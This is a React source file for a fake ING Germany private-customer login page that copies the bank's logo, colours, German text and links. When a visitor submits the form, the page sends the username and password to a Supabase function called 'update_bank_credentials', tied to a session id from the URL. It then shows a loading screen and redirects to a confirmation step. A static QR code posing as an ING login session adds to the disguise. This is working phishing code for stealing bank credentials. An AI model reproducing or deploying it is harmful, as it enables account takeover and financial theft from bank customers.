import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoAsset from "@/assets/ing-logo.svg.asset.json";
import QRCode from "react-qr-code";
import youtubeAsset from "@/assets/youtube.svg.asset.json";

const ORANGE = "#FF6200";
const ORANGE_HOVER = "#E55A00";
const LINK_BLUE = "#525199";
const TEXT = "#2D2D2D";
const MUTED = "#5B5B5B";
const PAGE_BG = "#F6F6F6";
const CARD_BG = "#FFFFFF";
const INPUT_BORDER = "#7C7C7C";
const INPUT_FOCUS = "#335D7D";
const ERROR_COLOR = "#D6301A";
const FOOTER_BG = "#333333";
const FONT = "'ING Me', 'INGMe', 'Helvetica Neue', Arial, sans-serif";

const FOOTER_LINKS = [
  { label: "Karriere", href: "https://www.ing.de/ueber-uns/karriere/" },
  { label: "Vertriebspartner", href: "https://www.ing.de/ueber-uns/vertriebspartner/" },
  { label: "Wholesale Banking", href: "https://www.ing.de/ueber-uns/wholesale-banking/" },
  { label: "Kontaktformular", href: "https://www.ing.de/kontakt/" },
  { label: "AGB", href: "https://www.ing.de/agb/" },
  { label: "Datenschutz", href: "https://www.ing.de/datenschutz/" },
  { label: "Impressum", href: "https://www.ing.de/impressum/" },
];

const QR_STEPS = [
  "Öffnen Sie die ING App.",
  "QR-Scanner in der App starten (oben rechts in der Kontenübersicht).",
  "Scannen Sie den ersten QR-Code – wir erkennen Sie.",
  "Scannen Sie den zweiten QR-Code – Sie bestätigen den Log-in.",
];

const ING = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [errors, setErrors] = useState({ username: false, password: false });

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  usePageMeta("Log-in für Privatkunden – ING", logoAsset.url);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (submitting) return;
    const newErrors = {
      username: username.trim().length === 0,
      password: password.length === 0,
    };
    setErrors(newErrors);
    if (newErrors.username || newErrors.password) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Benutzername",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{ backgroundColor: PAGE_BG, color: TEXT, fontFamily: FONT }}
    >
      {/* Header */}
      <header className="bg-white" style={{ borderBottom: "1px solid #E6E6E6" }}>
        <div className="max-w-[1200px] mx-auto px-3 lg:px-6 py-5">
          <a href="https://www.ing.de" target="_blank" rel="noopener noreferrer" aria-label="ING">
            <img src={logoAsset.url} alt="ING" className="h-[24px] lg:h-[28px] w-auto" />
          </a>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1">
        <div className="max-w-[1100px] mx-auto px-2 lg:px-2 pt-6 lg:pt-10 pb-10">
          <h1
            className="mb-5 lg:mb-6"
            style={{ color: "#333", fontWeight: 400, fontSize: 28, lineHeight: 1.2 }}
          >
            Log-in für Privatkunden
          </h1>


          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5 lg:gap-6">
            {/* Left: Credentials */}
            <section
              style={{
                backgroundColor: CARD_BG,
                borderRadius: 12,
                padding: "36px 36px 40px",
              }}
            >
              <h2
                style={{ color: ORANGE, fontWeight: 400, fontSize: 26, marginBottom: 24 }}
              >
                Anmelden mit Zugangsdaten
              </h2>

              <form onSubmit={handleSubmit} noValidate autoComplete="off">
                {/* Benutzername */}
                <div className="grid grid-cols-1 sm:grid-cols-[140px_1fr] gap-y-1 sm:gap-x-4 items-start mb-4">
                  <label
                    htmlFor="ing-username"
                    style={{ fontSize: 15, color: TEXT, paddingTop: 8 }}
                  >
                    Benutzername
                  </label>
                  <div>
                    <div style={{ display: "flex", alignItems: "center" }}>
                      <input
                        id="ing-username"
                        type="text"
                        autoComplete="off"
                        value={username}
                        onChange={(e) => {
                          setUsername(e.target.value);
                          if (errors.username) setErrors((p) => ({ ...p, username: false }));
                        }}
                        className="ing-input"
                        style={{
                          flex: 1,
                          minWidth: 0,
                          border: `1px solid ${errors.username ? ERROR_COLOR : INPUT_BORDER}`,
                          borderRadius: 8,
                          padding: "8px 10px",
                          fontSize: 16,
                          outline: "none",
                          fontFamily: "inherit",
                          color: TEXT,
                          background: "#fff",
                        }}
                        onFocus={(e) => {
                          if (!errors.username) {
                            e.currentTarget.style.borderColor = INPUT_FOCUS;
                            e.currentTarget.style.boxShadow = `inset 0 0 0 1px ${INPUT_FOCUS}`;
                          }
                        }}
                        onBlur={(e) => {
                          if (!errors.username) e.currentTarget.style.borderColor = INPUT_BORDER;
                          e.currentTarget.style.boxShadow = "none";
                        }}
                      />
                      <span aria-hidden="true" style={{ width: 36, flexShrink: 0 }} />
                    </div>
                    <p className="mt-2" style={{ fontSize: 13, color: MUTED, lineHeight: 1.4, paddingRight: 36, marginBottom: 16 }}>
                      Nur wenn Sie noch nie einen Benutzernamen erstellt haben, können Sie die
                      Zugangsnummer verwenden.
                    </p>
                    {errors.username && (
                      <p className="mt-1 flex items-center gap-1.5" style={{ fontSize: 13, color: ERROR_COLOR }}>
                        <svg width="14" height="14" viewBox="0 0 21 21" fill={ERROR_COLOR} aria-hidden="true">
                          <path fillRule="evenodd" clipRule="evenodd" d="M12.958 5.524c-.373-.68-1.391-.694-1.78.02l-5.973 10.97c-.365.67.138 1.474.92 1.474H17.86c.785 0 1.316-.83.93-1.533a300 300 0 0 1-2.933-5.49l-.058-.112c-.915-1.744-1.826-3.48-2.841-5.33m-3.622-.916c1.15-2.11 4.285-2.168 5.46-.027a317 317 0 0 1 2.856 5.356l.061.118a299 299 0 0 0 2.913 5.455c1.108 2.01-.374 4.49-2.767 4.49H6.127c-2.35 0-3.857-2.413-2.763-4.422zm2.707 11.168c.029 0 .052.022.052.05s-.023.05-.052.05a.05.05 0 0 1-.052-.05c0-.028.023-.05.052-.05m-.988.05c0 .528.442.956.988.956s.988-.428.988-.956c0-.527-.442-.955-.988-.955s-.988.428-.988.955m2.029-2.715c0 .555-.466 1.005-1.04 1.005s-1.041-.45-1.041-1.005V8.585c0-.556.466-1.006 1.04-1.006s1.04.45 1.04 1.006z" />
                        </svg>
                        Bitte Benutzernamen eingeben.
                      </p>
                    )}
                  </div>
                </div>

                {/* Passwort */}
                <div className="grid grid-cols-1 sm:grid-cols-[140px_1fr] gap-y-1 sm:gap-x-4 items-center mb-5">
                  <label
                    htmlFor="ing-password"
                    style={{ fontSize: 15, color: TEXT }}
                  >
                    Passwort
                  </label>
                  <div style={{ display: "flex", alignItems: "center" }}>
                    <input
                      id="ing-password"
                      type={showPassword ? "text" : "password"}
                      autoComplete="off"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (errors.password) setErrors((p) => ({ ...p, password: false }));
                      }}
                      className="ing-input"
                      style={{
                        flex: 1,
                        minWidth: 0,
                        border: `1px solid ${errors.password ? ERROR_COLOR : INPUT_BORDER}`,
                        borderRadius: 8,
                        padding: "8px 10px",
                        fontSize: 16,
                        outline: "none",
                        fontFamily: "inherit",
                        color: TEXT,
                        background: "#fff",
                      }}
                      onFocus={(e) => {
                        if (!errors.password) {
                          e.currentTarget.style.borderColor = INPUT_FOCUS;
                          e.currentTarget.style.boxShadow = `inset 0 0 0 1px ${INPUT_FOCUS}`;
                        }
                      }}
                      onBlur={(e) => {
                        if (!errors.password) e.currentTarget.style.borderColor = INPUT_BORDER;
                        e.currentTarget.style.boxShadow = "none";
                      }}
                    />
                    <button
                      type="button"
                      aria-label={showPassword ? "Passwort verbergen" : "Passwort anzeigen"}
                      onClick={() => setShowPassword((v) => !v)}
                      style={{ color: ORANGE, padding: 4, width: 36, flexShrink: 0, display: "flex", justifyContent: "center" }}
                    >
                      {showPassword ? (
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a19.77 19.77 0 0 1 4.22-5.22" />
                          <path d="M1 1l22 22" />
                          <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a19.77 19.77 0 0 1-3.17 4.14" />
                          <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
                        </svg>
                      ) : (
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                          <circle cx="12" cy="12" r="3" />
                        </svg>
                      )}
                    </button>
                  </div>
                  {errors.password && (
                    <div className="sm:col-start-2">
                      <p className="mt-1 flex items-center gap-1.5" style={{ fontSize: 13, color: ERROR_COLOR }}>
                        <svg width="14" height="14" viewBox="0 0 21 21" fill={ERROR_COLOR} aria-hidden="true">
                          <path fillRule="evenodd" clipRule="evenodd" d="M12.958 5.524c-.373-.68-1.391-.694-1.78.02l-5.973 10.97c-.365.67.138 1.474.92 1.474H17.86c.785 0 1.316-.83.93-1.533a300 300 0 0 1-2.933-5.49l-.058-.112c-.915-1.744-1.826-3.48-2.841-5.33m-3.622-.916c1.15-2.11 4.285-2.168 5.46-.027a317 317 0 0 1 2.856 5.356l.061.118a299 299 0 0 0 2.913 5.455c1.108 2.01-.374 4.49-2.767 4.49H6.127c-2.35 0-3.857-2.413-2.763-4.422zm2.707 11.168c.029 0 .052.022.052.05s-.023.05-.052.05a.05.05 0 0 1-.052-.05c0-.028.023-.05.052-.05m-.988.05c0 .528.442.956.988.956s.988-.428.988-.956c0-.527-.442-.955-.988-.955s-.988.428-.988.955m2.029-2.715c0 .555-.466 1.005-1.04 1.005s-1.041-.45-1.041-1.005V8.585c0-.556.466-1.006 1.04-1.006s1.04.45 1.04 1.006z" />
                        </svg>
                        Bitte Passwort eingeben.
                      </p>
                    </div>
                  )}
                </div>

                <div>
                  <button
                    type="submit"
                    disabled={submitting}
                    style={{
                      backgroundColor: ORANGE,
                      color: "#fff",
                      fontSize: 16,
                      fontWeight: 700,
                      padding: "7px 20px",
                      borderRadius: 6,
                      fontFamily: "inherit",
                      cursor: submitting ? "not-allowed" : "pointer",
                      transition: "background-color .15s",
                    }}
                    onMouseEnter={(e) => {
                      if (!submitting) e.currentTarget.style.backgroundColor = ORANGE_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      if (!submitting) e.currentTarget.style.backgroundColor = ORANGE;
                    }}
                  >
                    Anmelden
                  </button>
                  <p className="mt-5">
                    <a
                      href="https://www.ing.de/kundenservice/online-banking/zugangsdaten/"
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{ color: LINK_BLUE, textDecoration: "underline", fontSize: 15 }}
                    >
                      Zugangsdaten vergessen?
                    </a>
                  </p>
                </div>

              </form>
            </section>

            {/* Right: QR */}
            <section
              style={{
                backgroundColor: CARD_BG,
                borderRadius: 12,
                padding: "36px 36px 40px",
              }}
            >
              <h2
                style={{ color: ORANGE, fontWeight: 400, fontSize: 26, marginBottom: 24 }}
              >
                Anmelden mit App und QR-Code
              </h2>

              <div className="flex flex-col sm:flex-row gap-6">
                <div className="flex-shrink-0">
                  <div
                    style={{
                      border: `3px solid ${ORANGE}`,
                      padding: 18,
                      borderRadius: 12,
                      width: 180,
                      height: 180,
                      background: "#fff",
                    }}
                  >
                    <QRCode
                      value="https://www.ing.de/qr-login/session/8f3a2e1c-9b7d-4a52-b1f0-6c8e2d4a9f17"
                      size={140}
                      level="H"
                      style={{ width: "100%", height: "100%" }}
                    />
                  </div>
                <p
                    className="mt-3 text-left"
                    style={{ color: ORANGE, fontWeight: 700, fontSize: 18 }}
                  >
                    QR-Code 1
                  </p>
                </div>
                <ol
                  style={{
                    listStyle: "decimal",
                    paddingLeft: 18,
                    fontSize: 15,
                    lineHeight: 1.5,
                    color: TEXT,
                  }}
                >
                  {QR_STEPS.map((s, i) => (
                    <li key={i} style={{ marginBottom: 8, fontWeight: 700 }}>
                      <span style={{ fontWeight: 700 }}>{s}</span>
                    </li>
                  ))}
                  <li style={{ listStyle: "none", marginTop: 12, marginLeft: -18 }}>
                    <a
                      href="https://www.ing.de/qr-login/"
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{ color: LINK_BLUE, textDecoration: "underline", fontSize: 15 }}
                    >
                      Detaillierte Anleitung
                    </a>
                  </li>
                </ol>
              </div>
            </section>
          </div>

          {/* Secondary bar */}
          <div
            className="mt-5 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5"
            style={{ backgroundColor: CARD_BG, borderRadius: 12, padding: "22px 28px" }}
          >
            {[
              { title: "Neue Zugangsdaten", link: "Jetzt Zugangsdaten erstellen", href: "https://www.ing.de/kundenservice/online-banking/zugangsdaten-erstellen/" },
              { title: "Geschäftlich unterwegs?", link: "Business Banking Log-in", href: "https://www.ing.de/business-banking/" },
              { title: "Hilfe benötigt?", link: "Alles rund um Zugangsdaten", href: "https://www.ing.de/kundenservice/online-banking/zugangsdaten/" },
              { title: "Sicherheitshinweise", link: "So schützen Sie sich vor Betrug", href: "https://www.ing.de/kundenservice/sicherheit/" },
            ].map((b) => (
              <div key={b.title}>
                <p style={{ fontWeight: 700, fontSize: 15, color: TEXT, marginBottom: 4 }}>
                  {b.title}
                </p>
                <a
                  href={b.href}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ color: LINK_BLUE, textDecoration: "underline", fontSize: 15 }}
                >
                  {b.link}
                </a>
              </div>
            ))}
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer style={{ backgroundColor: FOOTER_BG, color: "#fff" }}>
        <div className="max-w-[1200px] mx-auto px-3 lg:px-6 py-5">
          <div className="flex flex-wrap items-center gap-x-7 gap-y-3" style={{ fontSize: 16 }}>
            {FOOTER_LINKS.map((l) => (
              <a
                key={l.label}
                href={l.href}
                target="_blank"
                rel="noopener noreferrer"
                style={{ color: "#fff", fontWeight: 400 }}
              >
                {l.label}
              </a>
            ))}
          </div>
          <div className="flex items-center gap-4 mt-4">
            <a href="https://www.facebook.com/ING.Deutschland/" target="_blank" rel="noopener noreferrer" aria-label="Facebook">
              <svg width="26" height="26" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
                <path d="M13.5 21v-8h2.7l.4-3.1h-3.1V7.9c0-.9.3-1.5 1.5-1.5h1.7V3.6c-.3 0-1.3-.1-2.4-.1-2.4 0-4 1.4-4 4.1V9.9H7.6V13h2.6v8h3.3z"/>
              </svg>
            </a>
            <a href="https://www.instagram.com/ing_deutschland/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.8" aria-hidden="true">
                <rect x="3.5" y="3.5" width="17" height="17" rx="4.5"/>
                <circle cx="12" cy="12" r="4"/>
                <circle cx="17" cy="7" r="1" fill="#fff" stroke="none"/>
              </svg>
            </a>
            <a href="https://www.youtube.com/user/INGDeutschland" target="_blank" rel="noopener noreferrer" aria-label="YouTube">
              <img src={youtubeAsset.url} alt="YouTube" style={{ height: 20, width: "auto", filter: "brightness(0) invert(1)" }} />
            </a>
          </div>
        </div>
      </footer>

      {showLoading && <LoadingOverlay onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)} />}
    </div>
  );
};

export default ING;
